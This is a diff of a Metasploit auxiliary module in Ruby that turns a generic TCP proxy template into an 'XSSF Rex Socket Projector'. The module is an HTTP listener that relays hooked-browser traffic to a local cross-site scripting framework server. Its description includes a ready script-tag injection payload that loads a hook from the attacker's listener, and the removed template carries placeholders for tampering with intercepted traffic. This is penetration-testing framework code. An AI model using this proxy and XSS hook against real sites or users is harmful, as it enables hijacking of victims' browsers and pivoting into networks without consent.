@@ -1,94 +1,71 @@
+##
+# $Id$
+##
+
 require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
 
-	# mixin Tcp
-	include Msf::Exploit::Remote::Tcp
-	# create alias methods
-	alias_method :cleanup_tcp, :cleanup
-	alias_method :run_tcp, :run
-	# mixin TcpServer
-	include Msf::Exploit::Remote::TcpServer
-	# create alias methods
-	alias_method :cleanup_tcpserver, :cleanup
-	alias_method :run_tcpserver, :run
-	alias_method :exploit_tcpserver, :exploit
-
+	include Exploit::Remote::HttpClient
+	include Exploit::Remote::HttpServer
 
 	def initialize
 		super(
-			'Name'        => 'TCP Proxy',
+			'Name'        => 'XSSF Rex Socket Projector',
 			'Version'     => '$Revision$',
 			'Description' => %q{
-				Screw with TCP
+				This module creates a rex socket to any local or pivot accessible
+				host which forwards http connections to the XSSF server running on 
+				localhost. By injecting something like '<script type="text/javascript" 
+				src="http://SRVHOST:SRVPORT/loop?interval=5"></script>' into
+				a page/response, XSSF can be hooked to a machine without direct
+				access to the MSF host.
 			},
-			'Author'      => 'unknown',
+			'Author'      => 'RageLtMan',
 			'License'     => MSF_LICENSE
 		)
 
-		# in my case I didn't need this SSL stuff
-		deregister_options('SSL', 'SSLCert', 'SSLVersion', 'RPORT')
+		deregister_options('RPORT', 'RHOST', 'URI', 'URIPATH')
 
 		register_options(
 			[
-				OptPort.new('SRVPORT', [ true, "", 0 ]),
-				OptString.new('SRVHOST', [ true, "Local listen address", "0.0.0.0" ]),
-				OptString.new('RHOST', [ true, "", "0.0.0.0" ]),
+				OptPort.new('SRVPORT', [ true, "Listener port", 80 ]),
+				OptAddress.new('SRVHOST', [ true, "Listener Socket Address", "0.0.0.0" ]),
 			], self.class)
 
 		#
-		datastore["RPORT"] = datastore["SRVPORT"]
+		datastore['RPORT'] = 8888
+		datastore['RHOST'] = '127.0.0.1'
+		datastore['URIPATH'] = '/'
 	end
 
 
-	# run tcp server, i.e. start listening port
 	def run
-		exploit_tcpserver
+		start_service
+		while !completed?
+			Rex::ThreadSafe.sleep(2)
+		end
 	end
 	alias_method :exploit, :run
 
-	# cleanup method, which calls both Tcp and TcpServer cleanup
-	def cleanup
-		cleanup_tcp()
-		cleanup_tcpserver()
+	def on_request_uri(cli, req)
+		vprint_good("Client #{cli.peerinfo} connected")
+		# Rewrite or target host
+		headers = req.headers.dup
+		headers['Host'] = "#{datastore['RHOST']}:#{datastore['RPORT']}"
+
+		# Setup the request headers
+		headers['Method'] = req.method
+		headers['Uri'] = req.uri
+
+		# Get response and return to client
+		res = send_request_raw(headers,20)
+		send_response(cli, res.body, res.headers)
 	end
 
-	# client connected, so we let the Tcp mixin connect
-	def on_client_connect(client)
-		print_status("client connected " + client.peerinfo())
-		connect()
+	def completed?
+		false
 	end
-
-	# client disconnected, so we let the Tcp mixin disconnect
-	def on_client_close(client)
-		print_status("client disconnected " + client.peerinfo())
-		disconnect()
-	end
-
-	def on_client_data(client)
-		begin
-			# receive from client
-			data = client.get_once()
-			return if data.nil? or data.length == 0
-
-			### do something evil with the tcp data here
-
-			# send data to server
-			sock.send(data, 0)
-			# receive data from server
-			respdata = sock.get_once()
-			return if respdata.nil? or respdata.length == 0
-
-			### do something evil with the tcp data here
-
-			# send data back to client
-			client.put(respdata)
-		rescue ::EOFError, ::Errno::EACCES, ::Errno::ECONNABORTED, ::Errno::ECONNRESET
-		rescue ::Exception
-			print_status("Error: #{$!.class} #{$!} #{$!.backtrace}")
-		end
-	end
-
 
 end
 
